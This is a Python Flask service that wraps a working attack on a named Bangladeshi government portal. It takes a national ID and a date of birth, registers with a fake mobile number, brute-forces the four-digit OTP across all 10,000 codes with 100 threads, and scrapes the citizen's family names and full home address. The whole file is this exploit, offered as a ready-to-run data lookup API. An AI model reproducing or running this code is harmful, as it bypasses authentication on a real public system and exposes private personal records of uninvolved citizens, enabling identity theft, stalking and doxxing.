from flask import Flask, request, jsonify
import requests
import random
import string
import re
import json
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

@app.route('/get-info', methods=['GET'])
def get_info():
    try:
        nid = request.args.get('nid')
        dob = request.args.get('dob')
        
        if not nid or not dob:
            return jsonify({'error': 'NID and DOB are required'}), 400

        # ==================== CONFIG ====================
        mobile_prefix = "017"
        batch_size = 500
        target_location = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"

        # OTP range
        otp_range = [f"{i:04d}" for i in range(10000)]

        def random_mobile(prefix):
            return prefix + f"{random.randint(0, 99999999):08d}"

        def random_password():
            return "#" + random.choice(string.ascii_uppercase) + f"{random.randint(0, 99)}"

        def get_cookie(data):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
            session = requests.Session()
            res = session.post(url, data=data, allow_redirects=False)
            if res.status_code == 302 and 'mov-verification' in res.headers.get('Location', ''):
                return session
            else:
                raise Exception("Bypass Failed")

        def try_otp(session, otp):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
            data = {
                "otpDigit1": otp[0],
                "otpDigit2": otp[1],
                "otpDigit3": otp[2],
                "otpDigit4": otp[3]
            }
            res = session.post(url, data=data, allow_redirects=False)
            if res.status_code == 302 and target_location in res.headers.get('Location', ''):
                return otp
            return None

        def try_batch(session, otp_batch):
            with ThreadPoolExecutor(max_workers=100) as executor:
                future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
                for future in as_completed(future_to_otp):
                    result = future.result()
                    if result:
                        executor.shutdown(cancel_futures=True)
                        return result
            return None

        def fetch_form_data(session):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
            res = session.get(url)
            return res.text

        def extract_fields(html, ids):
            result = {}
            for field_id in ids:
                match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html)
                result[field_id] = match.group(1) if match else ""
            return result

        def enrich_data(contractor_name, result):
            mapped = {
                "nameBangla": contractor_name,
                "nameEnglish": "",
                "nationalId": nid,
                "dateOfBirth": dob,
                "fatherName": result.get("fatherName", ""),
                "motherName": result.get("motherName", ""),
                "spouseName": result.get("spouseName", ""),
                "gender": "",
                "religion": "",
                "birthPlace": result.get("nidPerDistrict", ""),
                "nationality": result.get("nationality", ""),
                "division": result.get("nidPerDivision", ""),
                "district": result.get("nidPerDistrict", ""),
                "upazila": result.get("nidPerUpazila", ""),
                "union": result.get("nidPerUnion", ""),
                "village": result.get("nidPerVillage", ""),
                "ward": result.get("nidPerWard", ""),
                "zip_code": result.get("nidPerZipCode", ""),
                "post_office": result.get("nidPerPostOffice", "")
            }

            address_parts = [
                f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
                f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
                f"মৌজা/মহল্লা: {result.get('nidPerMouza', '')}",
                f"ইউনিয়ন ওয়ার্ড: {result.get('nidPerUnion', '')}",
                f"ডাকঘর: {result.get('nidPerPostOffice', '')} - {result.get('nidPerZipCode', '')}",
                f"উপজেলা: {result.get('nidPerUpazila', '')}",
                f"জেলা: {result.get('nidPerDistrict', '')}",
                f"বিভাগ: {result.get('nidPerDivision', '')}"
            ]
            address_line = ", ".join([p for p in address_parts if p.split(": ")[1]])

            mapped["permanentAddress"] = address_line
            mapped["presentAddress"] = address_line
            return mapped

        # Main workflow
        password = random_password()
        data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": random_mobile(mobile_prefix),
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        }

        # 1. Get cookie/session
        session = get_cookie(data)

        # 2. Shuffle OTPs and try in batches
        random.shuffle(otp_range)
        found_otp = None
        for i in range(0, len(otp_range), batch_size):
            batch = otp_range[i:i+batch_size]
            found_otp = try_batch(session, batch)
            if found_otp:
                break

        if found_otp:
            html = fetch_form_data(session)
            ids = ["contractorName","fatherName","motherName","spouseName","nidPerDivision",
                   "nidPerDistrict","nidPerUpazila","nidPerUnion","nidPerVillage","nidPerWard",
                   "nidPerZipCode","nidPerPostOffice"]
            result = extract_fields(html, ids)
            mapped_data = enrich_data(result.get("contractorName", ""), result)
            
            return jsonify(mapped_data), 200
        else:
            return jsonify({"error": "OTP not found"}), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
